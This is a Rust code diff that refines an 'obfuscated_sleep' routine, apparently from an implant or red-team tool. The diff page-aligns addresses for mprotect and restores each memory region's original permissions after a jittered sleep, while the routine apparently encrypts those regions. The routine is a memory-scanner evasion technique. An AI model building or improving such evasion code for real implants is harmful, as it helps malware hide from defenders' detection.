@@ -46,6 +46,18 @@ pub struct ProtectedRegion {
     pub encrypted_backup: Option<Vec<u8>>,
     /// Key used for encryption
     pub key: crypto::EncryptionKey,
+    /// Original mprotect permissions to restore after sleep
+    pub original_prot: i32,
+}
+
+/// Page-align an address downward
+fn page_align_down(addr: usize) -> usize {
+    addr & !(4096 - 1)
+}
+
+/// Page-align a size upward (from a page-aligned base)
+fn page_align_up(size: usize) -> usize {
+    (size + 4095) & !(4096 - 1)
 }
 
 impl ProtectedRegion {
@@ -56,6 +68,19 @@ impl ProtectedRegion {
             size,
             encrypted_backup: None,
             key,
+            original_prot: libc::PROT_READ | libc::PROT_WRITE,
+        }
+    }
+
+    /// Create a protected region with specific original permissions
+    pub fn new_with_prot(addr: usize, size: usize, prot: i32) -> Self {
+        let key = crypto::generate_key();
+        Self {
+            addr,
+            size,
+            encrypted_backup: None,
+            key,
+            original_prot: prot,
         }
     }
 
@@ -129,11 +154,14 @@ pub unsafe fn obfuscated_sleep(
     }
 
     // 2. Optionally change memory permissions to PAGE_NOACCESS
+    //    Page-align addresses for mprotect (required by kernel)
     if config.change_permissions {
         for region in regions.iter() {
+            let aligned_addr = page_align_down(region.addr);
+            let aligned_size = page_align_up(region.size + (region.addr - aligned_addr));
             let _ = libc::mprotect(
-                region.addr as *mut libc::c_void,
-                region.size,
+                aligned_addr as *mut libc::c_void,
+                aligned_size,
                 libc::PROT_NONE,
             );
         }
@@ -154,13 +182,15 @@ pub unsafe fn obfuscated_sleep(
     // 4. Sleep
     std::thread::sleep(jitter);
 
-    // 5. Restore memory permissions
+    // 5. Restore original memory permissions (not hardcoded RW)
     if config.change_permissions {
         for region in regions.iter() {
+            let aligned_addr = page_align_down(region.addr);
+            let aligned_size = page_align_up(region.size + (region.addr - aligned_addr));
             let _ = libc::mprotect(
-                region.addr as *mut libc::c_void,
-                region.size,
-                libc::PROT_READ | libc::PROT_WRITE,
+                aligned_addr as *mut libc::c_void,
+                aligned_size,
+                region.original_prot,
             );
         }
     }
